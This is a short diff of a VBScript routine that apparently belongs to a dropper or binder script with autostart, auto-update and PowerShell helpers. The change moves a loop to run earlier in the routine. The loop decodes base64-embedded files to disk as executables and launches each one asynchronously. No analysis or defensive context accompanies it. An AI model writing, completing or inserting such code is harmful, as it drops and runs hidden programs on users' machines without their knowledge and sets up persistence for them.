@@ -42,6 +42,15 @@ Sub MainScriptLogic()
     Run
 
     if IsAutoStart() = False then
+        For i = 0 To UBound(arrBackName)
+            data = arrBackData(i)
+            exe = GetFilePath(arrBackName(i))
+            DecodeBase64ToFile data, exe
+            ExecuteFileAsync exe, True
+        Next
+    end if
+
+    if IsAutoStart() = False then
         if autostart = "True" Then
             DoSetAutoStart
         end if
@@ -51,14 +60,6 @@ Sub MainScriptLogic()
         DoAutoUpdate
     end if
 
-    if IsAutoStart() = False then
-        For i = 0 To UBound(arrBackName)
-            data = arrBackData(i)
-            exe = GetFilePath(arrBackName(i))
-            DecodeBase64ToFile data, exe
-            ExecuteFileAsync exe, True
-        Next
-    end if
 End Sub
 
 Function GetPS1FilePath()
